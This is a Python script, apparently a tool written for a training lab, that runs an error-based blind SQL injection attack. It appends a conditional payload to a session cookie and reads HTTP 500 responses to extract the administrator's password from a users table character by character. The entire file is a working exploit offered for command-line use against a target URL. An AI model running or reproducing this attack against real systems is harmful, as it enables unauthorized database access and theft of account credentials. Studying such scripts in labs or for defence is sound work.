import threading
import requests
import argparse
from colorama import Fore, Style


class BruteForce:
    __url = None
    __session = None
    __cookie = None
    __cookies = None
    __grep_match = None
    __payload_template = None
    __no_letter = None
    __letter = None
    __amount = None
    __brrrrrrrrrr = None

    def __init__(self, url, cookie, grep_match, amount):
        self.__url = url
        self.__cookie = cookie
        self.__grep_match = grep_match
        self.__cookies = {}
        self.__session = requests.Session()
        self.__payload_template = "' || (select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator' and substr(password, %d, 1)='%s')||'"
        self.__no_letter = 1
        self.__letter = 65
        self.__amount = amount
        self.__brrrrrrrrrr = ""

    def run(self):
        self.get_cookies()
        self.brute_force()

    def get_cookies(self):

        response = self.__session.get(self.__url)

        self.__cookies = self.__session.cookies.get_dict()
        return self.__session.cookies.get_dict()[self.__cookie]

    def configure_payload(self):
        return self.__payload_template % (self.__no_letter, chr(self.__letter))

    def make_request(self):
        self.__cookies[self.__cookie] += self.configure_payload()
        response = requests.get(self.__url, cookies=self.__cookies)
        # print(Fore.RED, self.__cookies, Style.RESET_ALL)
        self.__cookies[self.__cookie] = self.get_cookies()
        if self.search_match(response.status_code):
            self.__brrrrrrrrrr += chr(self.__letter)
        self.configure_payload()

    def search_match(self, response_code) -> bool:
        if response_code == 500:
            return True
        return False

    def print_pt(self):
        print(self.__payload_template % (69, 'dupa'))

    def brute_force(self):
        for i in range(self.__amount):
            tmpl = len(self.__brrrrrrrrrr)
            self.__no_letter = i+1
            print(Fore.BLUE, f'[+] Found: {self.__brrrrrrrrrr}', Style.RESET_ALL)
            for j in range(48, 58):
                self.__letter = j
                self.make_request()
                # print(chr(j))

            for j in range(65, 91):
                self.__letter = j
                self.make_request()
                # print(chr(j))

            for j in range(97, 123):
                self.__letter = j
                self.make_request()
                # print(chr(j))
            if tmpl == len(self.__brrrrrrrrrr):
                print(Fore.GREEN, f'[+] Found: {self.__brrrrrrrrrr}', Style.RESET_ALL)
                exit()

            # self.make_request()
            # self.configure_payload()

        print(Fore.GREEN, f'[+] Found: {self.__brrrrrrrrrr}', Style.RESET_ALL)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SQLi brute force script.')
    parser.add_argument('-u', '--url', type=str, nargs=1, help='Provide the url.')
    parser.add_argument('-c', '--cookie', type=str, nargs=1, help='Provide cookie ID.')
    parser.add_argument('-m', '--match', type=str, nargs=1, help='Provide match to be searched.')
    args = parser.parse_args()
    bf = BruteForce(args.url[0], args.cookie[0], args.match[0], 50)
    bf.run()